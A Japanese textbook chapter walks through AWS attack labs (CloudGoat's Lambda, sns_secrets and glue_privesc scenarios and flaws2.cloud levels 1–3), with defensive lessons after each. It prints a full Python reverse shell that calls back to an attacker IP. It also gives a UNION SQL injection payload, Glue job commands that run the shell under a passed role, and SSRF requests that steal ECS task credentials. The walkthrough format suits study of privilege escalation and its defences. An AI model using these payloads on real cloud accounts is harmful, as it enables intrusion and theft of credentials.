# 第6章 クラウド固有サービスの攻撃（Lambda/コンテナ/Secrets）

## CloudGoatで学ぶサーバレス／権限昇格連鎖

このセクションでは、AWS のインテンショナルに脆弱な検証環境である **CloudGoat**（Rhino Security Labs が公開する「vulnerable by design」なAWS環境を Terraform で自動構築するツール）を題材に、クラウド固有サービス（Lambda・SNS・API Gateway・Glue・Secrets Manager・SSM Parameter Store）が絡む**権限昇格連鎖（privilege escalation chain）**を分解して学ぶ。

ここで扱う3つのシナリオは、いずれも「最初は権限の弱い IAM ユーザーの認証情報しか持っていない攻撃者が、クラウドサービスの設定ミスや IAM ポリシーの過剰権限を足がかりに、段階的に高い権限へと登っていく」という共通構造を持つ。防御側にとって重要なのは、**個々の権限は一見無害でも、それらが連鎖したときに管理者相当まで到達しうる**という「攻撃のグラフ構造」を理解することにある。

> **スコープに関する注意**: 本セクションは防御・検知・設計改善のための理解を目的とする。CloudGoat は自分の AWS アカウント内に自分で構築する練習環境である。実在の第三者サービスや本番環境に対する無許可の検証・破壊的操作は決して行ってはならない。以下のコマンド例は「なぜそれが成立するのか」という原理を理解するためのものであり、そのまま他者の環境に向けてはならない。

用語を最初に整理しておく。

- **IAM（Identity and Access Management）**: AWS の認可の仕組み。「誰が（Principal）」「どのサービスの何を（Action）」「どのリソースに対して（Resource）」できるかを **JSON ポリシー**で定義する。
- **PassRole（`iam:PassRole`）**: あるサービス（Lambda や Glue など）に対して「この IAM ロールの権限で動け」と**ロールを引き渡す**権限。これがあると、自分自身は持っていない権限でも、ロールを引き渡した先のサービスが代わりに実行してくれる。権限昇格の定番の「橋渡し」になる。
- **AssumeRole（`sts:AssumeRole`）**: STS（Security Token Service）を通じて、別の IAM ロールになりすまし、そのロールの一時認証情報を得る操作。
- **Pacu**: これも Rhino 製の、AWS 環境に対する攻撃・列挙（enumeration）フレームワーク。Metasploit の AWS 版のような位置づけで、`sns__enum` のようなモジュールを実行して環境を自動調査する。

---

### 6a-1. Vulnerable Lambda Functions — Lambda のソースコードと presigned URL を突く

最初のシナリオは、「アクセス委譲（access delegation）のために自作した Lambda 関数」を悪用する例である。組織が「ユーザーにポリシーを付与する処理を Lambda 関数に任せる」という設計をしたところ、その Lambda のコードに脆弱性があり、そこから管理者権限まで到達してしまう。

#### 出発点：弱い権限を持つユーザー bilbo

攻撃者は `bilbo` という IAM ユーザーの認証情報を持っている。このユーザーのポリシーは次の2点が肝になる。

- `iam:Get*` と `iam:List*` を `"Resource": "*"` で許可（＝ IAM の**閲覧・列挙が全リソースに対して可能**）
- `sts:AssumeRole` を `"Resource": "arn:aws:iam::940877411605:role/cg-lambda-invoker*"` で許可（＝ `cg-lambda-invoker` で始まるロールに**なりすませる**）

重要なのは、このユーザーには `iam:PassRole` が**付いていない**点だ。つまり「ロールを Lambda に引き渡して昇格する」という王道の手は使えない。**にもかかわらず昇格できてしまう**のは、後述するように Lambda の**コード自体の脆弱性（SQLインジェクション）**を突くからである。これが本シナリオの教育的な要点で、「PassRole を締めれば安全」という思い込みを崩す。

#### ステップ1：自分の権限を棚卸しする（列挙）

攻撃者はまず「自分は誰で、何ができるのか」を確定させる。`iam:List*`/`iam:Get*` が全許可なので、以下が順番に成立する。

```bash
# 自分の身元（アカウントID・ユーザーARN）を確認
aws sts get-caller-identity

# bilbo が所属するグループを調べる
aws iam list-groups-for-user --user-name bilbo

# グループに紐づくポリシー名を列挙
aws iam list-group-policies --group-name <group>

# ポリシー本体（Statement）を読む
aws iam get-policy --policy-arn <arn>
aws iam get-policy-version --policy-arn <arn> --version-id <v>

# インラインポリシー／アタッチ済みポリシーも確認
aws iam list-user-policies --user-name bilbo
aws iam get-user-policy --user-name bilbo --policy-name <name>
aws iam list-attached-user-policies --user-name bilbo
```

**なぜこれが可能か**: `iam:Get*`/`iam:List*` を `Resource: "*"` で与えることは、実務では「読み取りだけだから安全」と軽視されがちだ。しかし攻撃者から見れば、これは**環境全体の攻撃経路マップを合法的に手に入れられる**ということを意味する。どのロールが存在し、誰がどのロールに `AssumeRole` できて、どの Lambda が存在するか——すべてが列挙 API 経由で見える。列挙権限の過剰付与は「情報漏えい」ではなく「攻撃の設計図の提供」と捉えるべきである。

#### ステップ2：Lambda 関数のソースコードを丸ごと入手する

このシナリオの核心は、`aws lambda get-function` の応答に含まれる **`Code.Location`** フィールドである。

```bash
aws lambda get-function --function-name <name>
```

この応答には、Lambda のデプロイパッケージ（zip）を指す **presigned URL（署名付き URL）** が入っている。presigned URL は「一時的に、認証なしでその S3 オブジェクトにアクセスできる URL」だ。攻撃者はこの URL をブラウザや `curl` で開き、zip を**ダウンロードして展開**するだけで、Lambda の**ソースコード全体（`main.py` や同梱の依存ライブラリ）を読める**。

```bash
# 応答の Code.Location をコピーしてダウンロード
curl -o lambda.zip "<presigned-url>"
unzip lambda.zip
```

**なぜこれが危険か（仕組みレベル）**: 多くの開発者は「Lambda のコードはクラウド内部にあって外からは見えない」と暗黙に信じている。しかし `lambda:GetFunction` 権限（`iam:Get*` のワイルドカードに含まれうる）さえあれば、AWS は**署名付きの実物 zip へのリンクを返す**。これは設計どおりの挙動で、開発者・CI がコードを取得するための機能だ。つまり Lambda のコードは、`GetFunction` を許した相手にとっては**ホワイトボックス（中身が全部見える状態）**になる。ここに認証情報や SQL 文がハードコードされていれば即座に露出する。

#### ステップ3：Lambda コード内の SQL インジェクションを突く

入手した `main.py` を読むと、ユーザー入力がフィルタリングされずにそのまま SQL 文へ連結されている——古典的な **SQLインジェクション（SQLi: ユーザー入力が SQL 構文として解釈され、開発者の意図しないクエリが実行される脆弱性）** が存在する。攻撃者はソースを読んでいるので、テーブル構造もクエリの形も把握したうえで、この Lambda を（`AssumeRole` で得た `cg-lambda-invoker` 系ロール経由で）呼び出し、注入した入力で**本来なら許可されない IAM 操作（＝自分に管理者ポリシーを付与するなど）を Lambda に代行させる**。

**なぜ昇格が成立するか**: この Lambda は「アクセス委譲」を目的としているため、**Lambda 実行ロール自体が IAM を書き換える強い権限**を持っている。攻撃者本人（bilbo）は IAM の書き込み権限を持たないが、SQLi を通じてこの Lambda に任意の操作をさせられれば、**Lambda の権限で** IAM を書き換えられる。すなわち「弱いユーザー → Lambda 呼び出し → Lambda の強い実行ロール」という**権限の受け渡しが、PassRole ではなくコードの脆弱性を通じて起きている**。結果として攻撃者は管理者相当となり、Secrets Manager にアクセスしてフラグ（機密）を取得できる。

```bash
# 昇格後：Secrets Manager から機密を取得
aws --profile bilbo --region us-east-1 secretsmanager list-secrets
aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id <ARN>
```

#### このシナリオの防御教訓

- **アクセス委譲を自作 Lambda で実装しない**。Rhino の記事自身が「Lambda によるアクセス委譲は悪い考えだ。AWS IAM と AWS SSO というネイティブな解がある」と明言している。ロールベースの一時アクセスは AWS SSO（IAM Identity Center）で実現すべきで、独自コードにこの責務を負わせない。
- **Lambda のコードを本番前にセキュアコードレビューする**。SQLi はパラメータ化クエリ（プレースホルダを使い、入力を「値」としてのみ扱う）で防ぐ。
- **`lambda:GetFunction` の付与範囲を絞る**。`iam:Get*`/`iam:List*` を `Resource:"*"` で配る運用を見直し、presigned URL 経由でソースが露出しうる前提で権限設計する。
- **列挙権限を過剰に配らない**。読み取り専用でも、攻撃者にとっては地図になる。

> 出典: CloudGoat goes Serverless: Vulnerable Lambda Functions — https://rhinosecuritylabs.com/cloud-security/cloudgoat-vulnerable-lambda-functions/

---

### 6a-2. sns_secrets — SNS の購読権限から API Gateway の API キーを盗む

2つ目のシナリオは、**メッセージング配信サービス経由での機密漏えい**という、クラウドならではの経路を扱う。全体は「初期認証情報 → IAM/SNS 列挙 → SNS 購読で API キー入手 → API Gateway 認証 → フラグ取得」という3〜4段の連鎖になっている。

#### SNS という攻撃面

**SNS（Simple Notification Service）** は、発行者（publisher）が「トピック（topic）」にメッセージを流すと、そのトピックを**購読（subscribe）**している宛先（Email・SMS・HTTP エンドポイントなど）に**同じメッセージが配信される**、パブリッシュ／サブスクライブ型のマネージド配信サービスである。

このモデルの危険は、**「誰でも購読できてしまう」設定になっていると、トピックに流れる機密メッセージを攻撃者が受信できる**点にある。本シナリオでは、開発者が**デバッグ用のメッセージとして API Gateway の API キーをトピックに流し続けている**（記事によれば5分ごとに配信される）。

#### 出発点の IAM ポリシー

与えられた IAM ユーザーには、次の SNS アクションが許可されている。

- `sns:Subscribe`, `sns:Receive`, `sns:ListSubscriptionsByTopic`, `sns:ListTopics`, `sns:GetTopicAttributes`

API Gateway 側は `apigateway:GET` が許可されているが、`/apikeys`、`/restapis/*/resources/*/methods/`、および統合（integration）エンドポイントに対しては**明示的に Deny**されている。この Deny は「API キーそのものを API 経由では読ませない」ための防御だが、**SNS 経由で漏れる**ため意味をなさない——ここが設計の穴だ。

#### ステップ1：認証情報の設定と身元確認

```bash
aws configure --profile sns-secrets
aws sts get-caller-identity --profile sns-secrets
```

#### ステップ2：自分の権限を確認（CLI 列挙）

```bash
aws iam list-user-policies --user-name <UserName> --profile sns-secrets
aws iam get-user-policy --user-name <UserName> --policy-name <PolicyName> --profile sns-secrets
```

Pacu を使う場合は `iam__enum_permissions` モジュールでインライン／アタッチ済みポリシーから権限を確定できる。

#### ステップ3：SNS トピックを列挙し、購読する（Pacu）

```text
Pacu > import_keys sns-secrets
Pacu > run sns__enum --region us-east-1
Pacu > run sns__subscribe --topics <TopicARN> --email <あなたが受信できるEmail>
```

- `sns__enum`: 「Simple Notification Service のトピックを列挙・記述する」モジュール。存在するトピックの ARN を洗い出す。
- `sns__subscribe`: 指定トピックに購読を登録するモジュール。宛先として攻撃者自身が受信できる Email を指定する。

**なぜ機密が届くか（仕組み）**: SNS の購読は、宛先が Email の場合「**確認（confirm subscription）**」のワンステップを踏む。攻撃者は自分の受信箱に届いた確認リンクをクリックして購読を有効化する。以後、トピックに流れる**すべてのメッセージが攻撃者の受信箱に配信される**。開発者がデバッグ目的で API キーを流していれば、それがそのまま平文で届く。記事の表現では「SNS トピックの購読を確認すると、API Gateway の API キーを漏らすメッセージを受け取る」。

つまり `sns:Subscribe` を**トピックを限定せず**に配ってしまうと、そのトピックに流れる情報の機密性は「トピックに何を流すか」だけに依存することになる。**配信内容の機密性と購読の認可が分離されていない**のが根本問題である。

#### ステップ4：API Gateway を特定する

入手した API キーを使う先（REST API とステージ、リソースパス）を探す。

```bash
aws apigateway get-rest-apis --profile sns-secrets --region us-east-1
aws apigateway get-stages --rest-api-id <API_ID> --profile sns-secrets
aws apigateway get-resources --rest-api-id <API_ID> --profile sns-secrets
```

**API Gateway の用語**: REST API は「API 本体」、**ステージ（stage）**は `prod`/`dev` のようなデプロイ環境の単位、**リソース（resource）**は `/users` のようなパスである。呼び出す URL はこれらを組み立てて作る。

#### ステップ5：API キーを付けて最終エンドポイントを叩き、フラグ取得

```bash
curl -X GET "https://<API-ID>.execute-api.us-east-1.amazonaws.com/<stageName>/<resourcePath>" \
  -H "x-api-key: <API-KEY>"
```

**なぜ `x-api-key` ヘッダなのか**: API Gateway の「API キー」認証は、リクエストの **`x-api-key` HTTP ヘッダ**に鍵文字列を載せる方式で照合される。SNS 経由で盗んだ鍵をこのヘッダに入れれば、正規クライアントとまったく同じ形のリクエストになり、フラグ（保護されたレスポンス）が返る。

#### このシナリオの防御教訓

- **機密（API キー・認証情報）を SNS などのメッセージング経路に絶対に流さない**。デバッグ用でも本番トピックに機密を publish しない。
- **`sns:Subscribe` を最小権限にする**。トピックを限定せず購読できる状態は、その環境の全トピックの内容を第三者に開く。
- **SNS メッセージペイロードを暗号化し、API キーを定期ローテーションする**。
- **機密は Secrets Manager に置く**。配信サービスで運ぶのではなく、認可付きの秘密ストアから取り出す設計にする。
- **CloudTrail で SNS API・API Gateway アクセスをログ記録**し、不審な `Subscribe` を検知する。
- **API キーの作成・取得を管理者ロールに限定**する（本シナリオの `/apikeys` Deny はこの発想だが、漏えい経路が別にあると無力になる点に注意）。

> 出典: CloudGoat sns_secrets Walkthrough — https://rhinosecuritylabs.com/research/cloudgoat-sns_secrets/

---

### 6a-3. glue_privesc — SQLi でクレデンシャル窃取 → Glue で任意コード実行 → リバースシェル

3つ目は、**Web アプリの脆弱性（SQLi）とクラウドの権限昇格を橋渡し**する、最も「連鎖」らしいシナリオである。攻撃チェーンは「Web アプリ侵害 → 認証情報窃取 → AWS 権限昇格 → リバースシェル実行 → フラグ取得」の多段構成になる。

#### ステップ1：Web アプリの SQL インジェクションで認証情報を抜く

対象の Web アプリには「フィルタ」ボタンがあり、押すと DB クエリが走る。この POST リクエストの `selected_date` パラメータが**サニタイズされていない**。

**成立するペイロード:**

```text
selected_date=2023-10-01' UNION SELECT * FROM original_data--
```

**なぜ抜けるか（仕組み）**: `UNION SELECT` は「元のクエリの結果に、別の SELECT の結果を縦に連結する」SQL 構文である。攻撃者はまず正規の値 `2023-10-01` を書き、続くシングルクォート `'` で文字列リテラルを閉じてクエリ本文に割り込み、`UNION SELECT * FROM original_data` で **`original_data` テーブル全体を結果に混ぜ込む**。末尾の `--` は SQL のコメント開始で、元のクエリの残り（閉じ括弧や `WHERE` 続き）を無効化して構文エラーを避ける。結果として `original_data` の中身がレスポンスに現れ、そこに**平文の AWS 認証情報**が保存されている。

「認証情報を DB に平文で置く」こと自体が重大な設計ミスであり、SQLi と組み合わさって即座にクラウド侵入の入口になる。

#### ステップ2：窃取した認証情報で AWS を列挙

盗んだ認証情報は `glue-manager` という IAM ユーザーのものだった。

```bash
aws --profile glue-manager sts get-caller-identity
aws --profile glue-manager iam list-user-policies --user-name <username>
aws --profile glue-manager iam get-user-policy --user-name <username> --policy-name glue_management_policy
```

`glue-manager` のインラインポリシーには、**危険な組み合わせ**の権限が入っている。

- `glue:CreateJob`, `glue:StartJobRun`, `glue:UpdateJob`（Glue ジョブの作成・実行・更新）
- **`iam:PassRole`**（ロールの引き渡し）
- ワイルドカードの `iam:Get*` / `iam:List*`（全リソースへの列挙）

#### ステップ3：昇格経路の発見 —「PassRole できるロール」を探す

列挙により、`glue-manager` が引き渡せる（そして Glue に背負わせられる）ロール **`s3_to_gluecatalog_lambda_role`** が見つかる。このロールには3つの AWS 管理ポリシーが付いている。

- **AWSLambdaBasicExecutionRole** — CloudWatch Logs への書き込み
- **AWSGlueConsoleFullAccess** — AWS Glue のフル権限
- **AmazonS3FullAccess** — 全 S3 バケットへのフルアクセス

**なぜこの組み合わせが致命的か**: `glue-manager` 自身はコード実行能力を持たないが、`glue:CreateJob` + `iam:PassRole` があると、「**このロールで動け**」と `s3_to_gluecatalog_lambda_role` を指定した Glue ジョブを作れる。そして **AWS Glue の Python Shell ジョブは任意の Python コードを実行できる**。すなわち、攻撃者は自分の権限では実行できないコードを、**Glue ジョブという実行エンジン + 引き渡したロールの強い権限**で走らせられる。これが「PassRole + サービスのコード実行機能」による古典的な権限昇格である。

#### ステップ4：リバースシェルを用意し S3 に置く

Glue ジョブに実行させる Python スクリプト（攻撃者インフラへ接続を張り返す**リバースシェル**）を用意する。

```python
import socket
import subprocess

HOST = "INSERT IP ADDRESS HERE"   # 攻撃者が待ち受けるIP
PORT = 6666

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(b"Connection established")

while True:
    command = s.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode("utf-8"))

s.close()
```

**なぜ「リバース」シェルなのか**: Glue ジョブの実行環境（AWS 管理のコンテナ）へは、攻撃者から直接インバウンド接続できない。そこで**環境側から攻撃者へ接続を張り返す**（reverse）ことで、ファイアウォールやプライベートネットワークの制約を越えてコマンド実行チャネルを確立する。ループ内で `recv` した文字列を `subprocess.getoutput` でシェル実行し、結果を送り返すことで、攻撃者の待ち受けリスナーが対話的シェルになる。

`AmazonS3FullAccess` を持つ（引き渡し先ロールの権限、あるいは `glue-manager` 経由）ため、スクリプトを S3 バケットに置ける。

```bash
aws --profile glue-manager s3 cp scenarios/glue_privesc/rev.py s3://<bucket-name>/rev.py
```

#### ステップ5：悪意ある Glue ジョブを作成して実行

```bash
aws --profile glue-manager glue create-job \
  --name revshell \
  --role arn:aws:iam::<ACCOUNT>:role/s3_to_gluecatalog_lambda_role \
  --command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://<bucket>/rev.py"}'
```

```bash
aws --region us-east-1 --profile glue-manager glue start-job-run --job-name revshell
```

`start-job-run` は `JobRunId` を返し、実行が始まったことを示す。

**ポイント**: `--role` に指定しているのが引き渡し先の `s3_to_gluecatalog_lambda_role` であり、`--command` の `"Name":"pythonshell"` が「Python Shell ジョブ（任意 Python 実行）」を意味する。`ScriptLocation` に S3 上のリバースシェルを指すことで、**そのロールの権限で** `rev.py` が走る。ここで `iam:PassRole` が「自分より強いロールをジョブに背負わせる」橋渡しとして効いている。

#### ステップ6：ポストエクスプロイト — さらに別ロールへ、そして SSM でフラグ

リバースシェルが張られた後、シェル内で身元を確認すると、実行主体が **`ssm_parameter_role`**（SSM アクセスを持つロール）になっていることが分かる。

```bash
aws sts get-caller-identity
```

このロールは **SSM Parameter Store（設定値や機密を保存するキー・バリューストア）** にアクセスできるため、そこに保存されたフラグ（機密）を取り出せる。記事では最終的な取得コマンドまでは明示されていないが、経路としては `aws ssm get-parameter(s)` 系でパラメータを読むことになる。

> ⚠️ **未取得の資料**: glue_privesc 記事の「最終フラグを取得する正確な SSM コマンド」は原文に明示がありませんでした（記事本文が「SSM パラメータを取得してフラグを得る」とだけ記述）。以下は未取得部分の補足として一般知識に基づく解説です。SSM Parameter Store からの取得は通常、次のように行います。

```bash
# パラメータ名を列挙し、値（暗号化されていれば復号）を取得
aws ssm describe-parameters
aws ssm get-parameters-by-path --path "/" --recursive
aws ssm get-parameter --name "<param-name>" --with-decryption
```

`--with-decryption` は SecureString 型（KMS で暗号化されたパラメータ）を復号して返すオプションで、対象ロールが該当 KMS キーの復号権限を持っていれば平文が得られる。

#### このシナリオの防御教訓

- **DB に認証情報を平文で埋め込まない**。秘密は Secrets Manager / SSM SecureString に置き、ローテーションする。
- **SQLi をパラメータ化クエリで塞ぐ**。入力を SQL 構文としてではなく「値」としてのみバインドする。
- **`iam:PassRole` を無条件で配らない**。`PassRole` は `Condition`（`iam:PassedToService` など）で「どのサービスに、どのロールを」だけに厳格に限定する。ワイルドカードのロール指定は禁物。
- **Glue のような「任意コード実行が可能なサービス」への強いロール付与を見直す**。`AWSGlueConsoleFullAccess` + `AmazonS3FullAccess` + `iam:PassRole` の同居は、事実上の任意コード実行＋データ全アクセスを意味する。
- **ワイルドカードの Action / Resource を避ける**。`iam:Get*`/`iam:List*` の全許可は攻撃経路の地図を渡す。
- **Glue ジョブの作成・実行を監視し、想定外のスクリプト実行を検知**する（CloudTrail の `CreateJob`/`StartJobRun` を監視）。ネットワーク面ではアウトバウンドを制限し、リバースシェルの外向き接続を困難にする。

> 出典: CloudGoat glue_privesc Walkthrough — https://rhinosecuritylabs.com/cloud-security/cloudgoat-walkthrough-glue_privesc/

---

### 6a-4. 3シナリオを貫く「権限昇格連鎖」の共通原理

最後に、3つのシナリオを横断して見えてくる共通構造を整理する。これがクラウド固有の権限昇格を防御するうえでの本質である。

| 観点 | Vulnerable Lambda | sns_secrets | glue_privesc |
|---|---|---|---|
| 初期アクセス | 弱いユーザー bilbo | 制限付き IAM ユーザー | Web アプリの SQLi |
| 昇格の橋渡し | Lambda コードの SQLi（PassRole 不要） | SNS 購読による機密漏えい | `iam:PassRole` + Glue ジョブ |
| 悪用したサービス | Lambda / Secrets Manager | SNS / API Gateway | Glue / S3 / SSM |
| 最終到達点 | 管理者相当 → Secrets Manager | API キー → 保護 API | 別ロール → SSM でフラグ |

共通する教訓は次の4点に集約される。

1. **列挙権限は攻撃の設計図になる**。`iam:List*`/`iam:Get*` の `Resource:"*"` は、3シナリオすべてで「次の一手」を攻撃者に教えている。読み取り専用でも過剰付与は避ける。
2. **「サービスにロールを背負わせる」機能はコード実行に化ける**。Lambda・Glue のようにコードを実行できるサービスに強いロールが渡ると、`PassRole` あるいはコード脆弱性を通じて、自分の権限を超えた操作が可能になる。**PassRole は最も厳格に絞るべき権限**であり、同時に「PassRole を塞げば安全」ではない（Lambda シナリオが示すとおり、コード脆弱性でも昇格しうる）。
3. **機密は認可付きの秘密ストアに置き、配信・DB・コードに埋め込まない**。SNS への平文 API キー、DB への平文認証情報が、それぞれ致命的な入口になった。
4. **連鎖を前提に監視する**。単一のイベント（1回の `Subscribe`、1回の `CreateJob`）は無害に見えても、CloudTrail で連続した異常操作として捉え、`sts:AssumeRole` の連鎖や見慣れないサービスのジョブ作成をアラート対象にする。

CloudGoat の価値は、こうした連鎖を**自分の隔離アカウント内で安全に再現し、防御側の検知・設計を検証できる**ことにある。攻撃手順を暗記するためではなく、「なぜその設定が連鎖を許すのか」を仕組みから理解し、自組織の IAM ポリシー・秘密管理・監視を見直すために使うのが、本セクションの意図である。

## サーバレス実践ラボと日本語解説

本節では、サーバレス／コンテナ環境（AWS Lambda、API Gateway、ECS Fargate、ECR、Cognito）に対する攻撃手法を、公開されている学習用ラボ（flaws2.cloud、CloudGoat）と国内の技術解説記事（GMO Flatt Security ブログ）を通じて整理する。ここで扱うのはすべて自分専用の学習環境またはCTF形式の練習用インフラであり、実在の本番サービスに対して同様の手順を無許可で試みることは不正アクセス禁止法等に抵触しうるため厳禁である。本節の目的は「なぜその設定が危険なのか」という原理を理解し、自分たちのクラウド環境の防御に活かすことにある。

### 1. flaws2.cloud ― サーバレス／コンテナの攻守両面ラボ

flaws2.cloud は、flAWS.cloud の作者（Scott Piper）が公開している第二弾のクラウドセキュリティ学習サイトで、「Attacker（攻撃者）」と「Defender（防御者／インシデントレスポンダー）」という2つのパスから構成される。Attacker パスでは Lambda（サーバレス関数）と ECS Fargate（コンテナオーケストレーション）の設定ミスを突く一方、Defender パスでは同じアプリケーションを「被害を受けた側」として見て、実際の攻撃ログを CloudTrail/Athena/jq で解析する演習になっている。攻守双方を体験できる構成そのものが、実務での「攻撃者視点のペネトレーションテスト」と「防御側のログ解析・インシデントレスポンス」を橋渡しする教材として設計されている点が特徴である。

> ⚠️ **未取得の資料**: 「flAWS2.cloud」公式サイト本体（http://flaws2.cloud/）は、本セクション作成時にネットワーク接続エラー（ECONNRESET、複数回リトライも失敗）により自動取得できませんでした。以下のURLからご自身で直接ご覧ください: http://flaws2.cloud/
> 以下は代替として取得した複数の日本語・英語ウォークスルー記事（`kishoreramk.medium.com`、`muratbekgi.com`、`executeatwill.com` 等の要約）と一般知識に基づく解説です。

#### 1-1. Level 1: クライアント側バリデーションの回避とエラーレスポンスからの認証情報漏えい

最初のレベルはブラウザ上で「PINコードを入力してください」という画面が表示される。フォームはJavaScriptによって数字4桁のみを許可するようにクライアント側で制限されているが、これはあくまで見た目上の制約であり、開発者ツール（ブラウザのNetworkタブ）からリクエストを直接書き換えれば、サーバー側（API Gateway → Lambda）には任意の文字列を送信できる。

```bash
# 期待される入力（数字）ではなく文字列を送るようリクエストを改ざんする
# → Lambda側でパース処理が失敗し、スタックトレース付きの500エラーが返る
```

このとき返される500エラーのレスポンスボディには、Lambda関数のソースコードの一部やデバッグ情報が含まれており、そこに `AWS_ACCESS_KEY_ID` や `AWS_SECRET_ACCESS_KEY`、`AWS_SESSION_TOKEN` が平文で埋め込まれていた、というのがこのレベルの核心である。

```bash
# 得られた一時クレデンシャルをAWS CLIのプロファイルとして登録
aws configure --profile level1
aws sts get-caller-identity --profile level1
aws s3 ls s3://level1.flaws2.cloud --profile level1
```

**なぜこれが起きるのか（仕組みレベル）**: Lambda関数は実行時にIAMロールから一時クレデンシャル（STSのAssumeRoleによって発行されるアクセスキー・シークレットキー・セッショントークンの3点セット）を受け取り、これを環境変数として実行コンテキストに保持する。多くのランタイムでは、未処理の例外が発生した際にデバッグ目的で環境変数一覧やスタックトレースをそのままレスポンスに出力してしまう実装が見られる。クライアント側のバリデーションはあくまでUXのためのものであり、信頼境界（trust boundary）の外側にあるブラウザ側のJavaScriptを「本当の入力検証」として扱ってしまうと、この種の迂回は常に成立する。防御としては、(1) サーバー側（Lambda本体）でも型・形式チェックを独立して行う、(2) 本番環境では詳細なスタックトレースやデバッグ情報をレスポンスに含めない（`try/except`で汎用エラーメッセージに丸める）、(3) 環境変数に直接シークレットを置かず、実行時にAWS Secrets ManagerやSSM Parameter Storeから都度取得する設計にする、という三段構えが基本になる。

> 出典: flAWS2.cloud（http://flaws2.cloud/）ならびに関連ウォークスルー（KISHORERAM「Flaws2.cloud WalkThrough」、Murat Bekgi「flaws2.cloud walkthrough」） — http://flaws2.cloud/ / https://kishoreramk.medium.com/flaws2-cloud-walkthrough-aws-cloud-security-5540360e512f / https://www.muratbekgi.com/flaws2-cloud-walkthrough-all-flaws2-cloud-levels/

#### 1-2. Level 2: パブリックなECRリポジトリからのイメージ層抽出とクレデンシャル発見

続くレベルはコンテナ（`http://container.target.flaws2.cloud/`）として稼働している。ここで着目すべきは「S3バケットだけでなく、ECR（Elastic Container Registry）などAWS上の他のリソースにも“意図しない公開権限”が付与され得る」という点である。この演習ではリポジトリ名 `level2` のECRリポジトリが外部から読み取り可能な設定になっている。

```bash
# 対象アカウントの公開ECRリポジトリからイメージ一覧・マニフェストを取得
aws ecr list-images --repository-name level2 --registry-id 653711331788
aws ecr batch-get-image --repository-name level2 --image-ids imageTag=latest
aws ecr get-download-url-for-layer --repository-name level2 --layer-digest "sha256:<digest>"
```

取得したマニフェストJSONから各レイヤーのdigestを取り出し、レイヤー（実体はtar.gzのファイルシステム差分）を個別にダウンロードして展開すると、Dockerイメージのビルド過程で埋め込まれた設定ファイル（例: `/etc/nginx/.htpasswd`）の中に認証情報が残っていることが分かる。

**なぜこれが起きるのか**: Dockerイメージはレイヤー構造を持ち、各レイヤーは「そのビルドステップで変更されたファイル群」の差分アーカイブである。`Dockerfile`内で `COPY secrets.txt /app/` のように一度でもファイルをイメージにコピーしてしまうと、たとえ後続のステップで `rm secrets.txt` によって最終的なファイルシステム上から見えなくしても、そのファイルを含むレイヤー自体はイメージの一部としてレジストリに残り続け、レイヤー単位でダウンロードすれば復元できてしまう。これはLambdaのコンテナイメージデプロイ（Lambdaは.zipパッケージだけでなくコンテナイメージからも作成可能）やECS/Fargateのタスク定義で使うイメージでも同様に起こり得る典型的な事故パターンである。防御としては、(1) ビルド時のみ必要な機密情報はマルチステージビルドで最終イメージに含めない、(2) レジストリのIAMポリシー・リソースベースポリシーで匿名/クロスアカウントアクセスを明示的に拒否する、(3) 一度露出したシークレットはイメージから削除するだけでなく必ずローテーションする、という点が重要になる。

> 出典: flAWS2.cloud Level 2 ウォークスルー（Murat Bekgi、KISHORERAM 各記事） — http://flaws2.cloud/ / https://www.muratbekgi.com/flaws2-cloud-walkthrough-all-flaws2-cloud-levels/

#### 1-3. Level 3: プロキシ機能を悪用したSSRFとECSタスクロール窃取

このレベルのコンテナアプリケーションには、指定したURLの内容を取得して返す「プロキシ」機能（`http://container.target.flaws2.cloud/proxy/<URL>`）が実装されている。これは典型的なSSRF（Server Side Request Forgery、サーバー自身に任意の宛先へリクエストを発行させる脆弱性）の温床であり、アクセス先URLのホワイトリスト検証が行われていないと、外部向けのURLだけでなく、コンテナ自身のローカルファイルシステムやクラウド内部のメタデータエンドポイントへもアクセスできてしまう。

```bash
# ① コンテナ内部のプロセス環境変数を読み取り、ECSタスクの資格情報エンドポイントURIを特定
curl http://container.target.flaws2.cloud/proxy/proc/self/environ
# → 出力中に AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/<GUID> が含まれる

# ② ECSタスクメタデータのクレデンシャルエンドポイント(169.254.170.2)へプロキシ経由でアクセス
curl "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/<GUID>"
# → タスクにアタッチされたIAMロールの一時クレデンシャルがJSONで返る

# ③ 得られた資格情報でS3等の権限を確認
aws s3 ls --profile level3-task-role
```

**なぜこれが起きるのか（仕組みレベル）**: ECS FargateやEC2上のECSタスクは、EC2インスタンスメタデータサービス（IMDS、`169.254.169.254`）に類似した仕組みとして、タスク単位のクレデンシャル配布エンドポイント（`169.254.170.2`、ECS Task Metadata/Credentials Endpoint）を持つ。コンテナ内のプロセスは環境変数 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` に設定されたパスへHTTPリクエストを送るだけで、そのタスクにアタッチされたIAMロールの一時クレデンシャルを取得できる設計になっている。これは通常、コンテナ内の正規のAWS SDKが自動的に利用するための機能だが、アプリケーションにSSRF脆弱性（今回はURLプロキシ機能）が存在すると、攻撃者は「コンテナの内部ネットワーク視点」からこのリンクローカルアドレスにアクセスでき、正規のSDKと同じ手順でロールの資格情報を丸ごと奪取できてしまう。`/proc/self/environ` を読める点自体もパストラバーサル／ローカルファイルアクセスの一種であり、プロキシ実装がスキーム（`http://`）や宛先ホストの検証を行っていないことがすべての元凶である。防御としては、(1) SSRFの一般的対策（宛先ホストのアローリスト化、リダイレクト追跡の禁止、`169.254.0.0/16` などリンクローカル帯域への到達をネットワークポリシーやiptablesで遮断）、(2) ECSタスクロールにも最小権限の原則を適用し、仮に漏えいしても被害を限定する、(3) IMDSv2相当の追加ヘッダー要求（ECS版では `ECS_AGENT_URI` の資格情報にトークンを要求する設定強化）を有効にする、といった多層防御が求められる。

> 出典: flAWS2.cloud Level 3（SSRF/ECSメタデータ）ウォークスルー（Murat Bekgi「flaws2.cloud walkthrough」） — https://www.muratbekgi.com/flaws2-cloud-walkthrough-all-flaws2-cloud-levels/

